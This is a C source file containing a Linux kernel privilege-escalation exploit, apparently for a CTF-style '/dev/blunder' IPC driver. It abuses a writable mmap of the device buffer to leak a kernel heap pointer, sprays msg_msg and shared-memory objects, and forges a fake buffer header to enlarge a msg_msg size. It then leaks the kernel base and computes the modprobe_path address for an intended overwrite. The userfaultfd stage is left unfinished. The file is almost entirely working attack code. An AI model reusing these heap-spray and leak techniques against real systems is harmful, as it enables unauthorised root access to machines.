#define _GNU_SOURCE

#include <sys/shm.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <stdlib.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <poll.h>


#define IPC "/dev/blunder"
#define IOCTL_BLUNDER_SET_CTX   _IOWR('s', 1, uint64_t)
#define IOCTL_BLUNDER_SEND_MSG  _IOWR('s', 2, struct blunder_user_message)
#define IOCTL_BLUNDER_RECV_MSG  _IOWR('s', 3, struct blunder_user_message)

#define INIT_IPC_NS 0xc620
#define INIT_IPC_NS_OFF 0x169c620
#define MODPROBE_PATH_OFF 0x1644600
#define PAGESZ 0x1000

static int qids[5];
static int userfaultqid;

static int shmids[100];
static int fds[100];
static void *shmaddr[100];
static unsigned long kbase = 0x0;
static unsigned long modprobe_path = 0x0;
static void *page;
static unsigned long *addr;
static unsigned long overflow[0x7];


struct blunder_user_message{
        int handle;
        int opcode;
        void *data;
        size_t data_size;
        size_t *offsets;
        size_t offsets_size;
        int *fds;
        size_t num_fds;
};

struct blunder_buffer{
        unsigned long blunder_buffer_next;
        unsigned long blunder_buffer_prev;
        size_t free;
        size_t buffer_size;
        size_t data_size;
        size_t offsets_size;
        unsigned char data[0];
};

int blunder_send_message(int fd, void *data, size_t data_size, int *fds, size_t num_fds){
        struct blunder_user_message umsg  = {
                .handle = getpid(),
                .opcode = 0x0,
                .data = data,
                .data_size = data_size,
                .offsets = NULL,
                .offsets_size = 0x0,
                .fds = fds,
                .num_fds = num_fds,
        };
        ioctl(fd, IOCTL_BLUNDER_SEND_MSG, &umsg);
}

void send_msg(int qid, long type, int size, int c){
        struct msgbuf{
                long mtype;
                char mtext[size];
        }msg;

        msg.mtype = type;
        memset(msg.mtext, c, sizeof(msg.mtext));

        if(qids[0] == qid){
                unsigned long *mem = (unsigned long *) msg.mtext;
                int off = 0x1f6;

                mem[off++] = 0x1; //atomic_free
                mem[off++] = 0x30; //buffer_size
                mem[off++] = 0x30; //data_size
                mem[off++] = 0x0; //offsets_size

                if(msgsnd(qid, &msg, sizeof(msg.mtext), IPC_NOWAIT) == -1){
                        perror("send_msg: msgsnd()");
                        _exit(-1);
                }
        }else{
                if(msgsnd(qid, &msg, sizeof(msg.mtext), IPC_NOWAIT) == -1){
                        perror("msgsnd:");
                        _exit(-1);
                }
        }
}

//spray the msg_msg objects of a variable size on the heap
void msg_msg_spray(void){
        for(int i = 0;i < sizeof(qids)/sizeof(int); i++){
                if ((qids[i] = msgget(IPC_PRIVATE, IPC_CREAT|0666)) < 0){
                        perror("msgget");
                        _exit(-1);
                }
        }

        //send messages via all the allocated ques
        for(int ii = 0;ii < sizeof(qids)/sizeof(int); ii++){
                send_msg(qids[ii], (ii + 1), 0xfe8, (0x41 + ii));
        } 

}

//This is used to receive messages from the message queue
void *recv_msg(int qid, size_t size){
        void *mem = malloc(size);

        int ret = msgrcv(qid, mem, size, 0, IPC_NOWAIT|MSG_COPY|MSG_NOERROR);

        if(ret == -1){
                perror("msgrcv");
                _exit(-1);
        }

        //fprintf(stderr, "[+] 'msgrcv' received %d bytes!\n" ,ret);
        return mem;
}

void alloc_shm(int idx){
        shmids[idx] = shmget(IPC_PRIVATE, 0x1000, IPC_CREAT|0600);
        if (shmids[idx] < 0){
                perror("shmget");
                _exit(-1);
        }

        shmaddr[idx] = (void *) shmat(shmids[idx], NULL, SHM_RDONLY);
        if(shmids[idx] < 0){
                perror("shmat");
                _exit(-1);
        }
}

void kill_shm(int idx){
        shmdt(shmaddr[idx]);
        shmctl(shmids[idx], IPC_RMID, NULL);
}

void leak_address(void){
        for(int i = 0; i < sizeof(qids)/sizeof(int); i++){
                unsigned long *mem = (unsigned long *) recv_msg(qids[i], 0x2000);
                if (mem == NULL)
                        continue;
                for(int i = 0;i < 0x400; i++){
                        if((mem[i] & 0xffff) == INIT_IPC_NS){
                                kbase = mem[i] - INIT_IPC_NS_OFF;
                                fprintf(stderr, "[+] Kbase: 0x%lx\n", kbase);

                                return;
                        }
                }
                fprintf(stderr, "[+] No Kernel address leaked\n");

                for(int i = 0;i < 100;i ++)
                        kill_shm(i);
                _exit(-1);
        }
}

int userfaultfd(int flags){
        return syscall(SYS_userfaultfd, flags);
}

int init_ufd(void){
        int fd;

        fprintf(stderr, "[+] Userfaultfd mapping page..!\n");
        page = mmap((void *) 0xdead000, PAGESZ, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);

        if (page == NULL){
                fprintf(stderr, "[!] init_ufd() failed!\n");
                _exit(-1);
        }

        if (userfaultqid < 0){
                perror("init_ufd: msgget()");
                _exit(-1);
        }


        struct uffdio_register reg;

        if ((fd=userfaultfd(O_NONBLOCK)) < 0){
                perror("[!] Userfaultfd()");
                _exit(-1);
        }

        struct uffdio_api api = { .api = UFFD_API };

        if(ioctl(fd, UFFDIO_API, &api)){
                perror("userfaultfd ioctl():\n");
                _exit(-1);
        }

        if (api.api != UFFD_API){
                fprintf(stderr, "[!] Unexpected UFFD API Version!\n");
                _exit(-1);
        }

        fprintf(stderr, "[+] Userfaultfd monitoring: %p - %p\n", page, page + PAGESZ);

        reg.mode = UFFDIO_REGISTER_MODE_MISSING;
        reg.range.start = (long) (page);
        reg.range.len = PAGESZ;

        if(ioctl(fd, UFFDIO_REGISTER, &reg)){
                perror("ioctl(UFFDO_REGISTER):\n");
                _exit(-1);
        }

        return fd;
}

//This is the page fault-handler 
void *page_fault_handler(void *_ufd){
        struct pollfd pollfd;
        struct uffd_msg fault_msg;
        struct uffdio_copy ufd_copy;

        int ufd = *((int *) _ufd);

        pollfd.fd = ufd;
        pollfd.events = POLLIN;

        while(poll(&pollfd, 1, -1) > 0){
                if ((pollfd.revents & POLLERR) || (pollfd.revents & POLLHUP)){
                        perror("poll()");
                        _exit(-1);
                }

                if (read(ufd, &fault_msg, sizeof(fault_msg)) != sizeof(fault_msg)){
                        perror("[!] poll: read()\n");
                        _exit(-1);
                }
                char *page_fault_location = (char *) fault_msg.arg.pagefault.address;
                if (fault_msg.event != UFFD_EVENT_PAGEFAULT || (page_fault_location != page && page_fault_location != page + PAGESZ)){
                        fprintf(stderr, "[!] Unexpected pagefault in the wrong address range!\n");
                        _exit(-1);
                }

                if (page_fault_location == (void *) 0xdead000){
                        fprintf(stdout, "[+] Pagefault at address: %p\n", page_fault_location);
                        //When the fault occurs do some stuff
                }

        }
}

void *alloc_msg(){
        fprintf(stderr, "[Thread 2]: msg_msg allocatd at 0x%lx\n", page);

        int qid = msgget(IPC_PRIVATE, IPC_CREAT|0666);
        if (qid < 1){
                perror("alloc_msg: msgget()");
                _exit(-1);
        }

        send_msg(qid, 0xcafebabe, 0xfd0, 0x49);
}

void kill_qid(int qid){
        if(msgctl(qid, IPC_RMID, NULL) < 0){
                perror("kill_qid:msgctl()");
                _exit(-1);
        }
}


int main(int argc, char **argv){
        pthread_t tid[2]; //create two thread

        int fd = open(IPC, O_RDWR);
        if(fd < 0){
                fprintf(stderr, "[!] Error opening device file!\n");
                _exit(-1);
        }
        fprintf(stderr, "[+] open'd /dev/blunder for O_RDWR\n");

        addr = (unsigned long *) mmap(NULL, 0x1000, PROT_READ, MAP_SHARED, fd, 0);
        fprintf(stderr, "[+] mmap'd address: %p\n", addr);

        //Change the protection of the mmap'd address to READ_WRITE
        int mp = mprotect(addr, 0x2000, PROT_WRITE|PROT_READ);
        if(mp){
                fprintf(stderr, "[-] mprotect error!\n");
                _exit(-1);
        }

        fprintf(stdout, "[+] mprotect'd address success!\n");

        //send a message to split the buffer 
        int fds[] = {1337};
        unsigned char buffer [0x10]; 
        memset(buffer, 0x41, sizeof(buffer));


        //send the buffer 
        blunder_send_message(fd, buffer, sizeof(buffer), fds, sizeof(fds)/sizeof(fd));

        unsigned long leaked_heap_address = (unsigned long) addr[0];
        fprintf(stderr, "[+] Leaked Kernel Heap address: 0x%lx\n", leaked_heap_address);

        for(int i = 0; i < 50;i++)
                alloc_shm(i);

        fprintf(stderr, "[+] Spraying 'msg_msg' objects!\n");
        msg_msg_spray();


        for(int i = 50; i < 100; i++)
                alloc_shm(i);


        unsigned long fake_blunder_buffer = (leaked_heap_address - 0x40) + 0xfc0;
        fprintf(stderr, "[+] Fake blunder_buffer: 0x%lx\n", fake_blunder_buffer);

        //overwriting our current->next with the fake chunk
        addr[0] = fake_blunder_buffer;

        //update the fake buffer
        int off = 0x1fa;
        addr[off++] = (unsigned long) 0x1; //atomic_free
        addr[off++] = (unsigned long) 0x30; //buffer_size
        addr[off++] = (unsigned long) 0x30; //data_size


        memset(overflow, 0x42, 2 * sizeof(unsigned long)); //overflow into the allocated buffer


        overflow[0x4] = (unsigned long) 0xdeadbeef; //m_type
        overflow[0x5] = (unsigned long) 0x2000; //m_ts with a bigger value

        blunder_send_message(fd, overflow, 0x30, fds, sizeof(fds)/sizeof(fd));

        //Leak address in the kmalloc-32 to find INIT_IPC_NS
        leak_address();
        modprobe_path = kbase + MODPROBE_PATH_OFF;

        fprintf(stdout, "[+] Modprobe Path: 0x%lx\n", modprobe_path);

        //free the nearest 'msg_msg' whose pointers are not tampered with
        kill_qid(qids[1]);

        //adjust our fake blunder_buffer near the unallocated heap
        addr[0] = (leaked_heap_address - 0x40) + (0x1fd0);

        //allocate a new 'msg_msg' that should fill the whole left behind triggering our page_fault
        //When the page-fault is triggered, overwrite the msg->next with the address of our modprobe_path to overwrite the value to our malicious path
        //alloc_msg();

        getchar();

        //free Q1 to create a hole in the heap
        for(int i = 0;i < 100; i++)
                kill_shm(i);

        return 0;
}
